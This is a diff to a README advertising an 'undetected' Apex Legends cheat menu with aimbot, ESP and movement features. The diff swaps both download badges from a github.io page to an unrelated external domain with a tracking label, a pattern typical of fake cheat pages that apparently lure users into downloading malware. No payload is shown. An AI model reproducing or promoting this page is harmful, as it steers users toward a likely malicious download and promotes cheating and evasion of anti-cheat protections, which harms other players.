@@ -2,7 +2,7 @@
 
 The **Apex Legends Cheat Menu** is a powerful, undetected tool designed to give players an advantage in one of the most competitive battle royale games on the market. Whether you're climbing the ranks or just having fun, this cheat menu offers a wide range of features that enhance combat efficiency, awareness, and tactical control.
 
-[![Download Apex CheatMenu](https://img.shields.io/badge/Download-Apex%20CheatMenu-blueviolet)](https://apex-cheat-menu.github.io/.github/)
+[![Download Apex CheatMenu](https://img.shields.io/badge/Download-Apex%20CheatMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 Engineered with stealth, speed, and precision in mind, the menu provides access to reliable aimbot configurations, ESP visuals, and movement enhancements that make you a formidable opponent in every match — all while minimizing detection risks.
 
@@ -40,4 +40,4 @@ Engineered with stealth, speed, and precision in mind, the menu provides access 
 - Lightweight and optimized for **low system impact**.
 - Works on all major Apex Legends patches and regions.
 
-[![Download Apex CheatMenu](https://img.shields.io/badge/Download-Apex%20CheatMenu-blueviolet)](https://apex-cheat-menu.github.io/.github/)
+[![Download Apex CheatMenu](https://img.shields.io/badge/Download-Apex%20CheatMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
